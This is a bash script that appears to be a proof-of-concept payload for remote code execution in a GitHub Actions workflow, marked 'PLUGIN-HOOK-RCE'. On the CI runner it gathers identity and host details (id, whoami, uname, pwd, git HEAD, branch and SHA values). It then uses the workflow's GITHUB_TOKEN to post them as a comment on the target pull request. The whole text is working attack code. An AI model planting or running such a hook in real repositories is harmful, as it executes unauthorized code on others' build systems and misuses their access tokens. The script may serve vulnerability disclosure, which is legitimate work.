#!/usr/bin/env bash
set -euo pipefail

short_base="${BASE_SHA:-no-base}"
short_base="${short_base:0:7}"
marker="PLUGIN-HOOK-RCE-${GITHUB_RUN_ID:-no-run}-${short_base}"

body="$(cat <<EOF
${marker}
source_branch=${SOURCE_BRANCH:-unknown}
source_sha=${SOURCE_SHA:-unknown}
base_branch=${BASE_BRANCH:-unknown}
base_sha=${BASE_SHA:-unknown}
event=${GITHUB_EVENT_NAME:-unknown}
id=$(id)
whoami=$(whoami)
pwd=$(pwd)
uname=$(uname -a)
date_utc=$(date -u +%FT%TZ)
git_rev_parse_HEAD=$(git rev-parse HEAD 2>/dev/null || printf unknown)
EOF
)"

comment_file="$(mktemp)"
jq -n --arg body "$body" '{body:$body}' > "$comment_file"

curl -fsS -X POST \
  -H "Authorization: Bearer ${GITHUB_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments" \
  --data @"$comment_file" >/dev/null

rm -f "$comment_file"
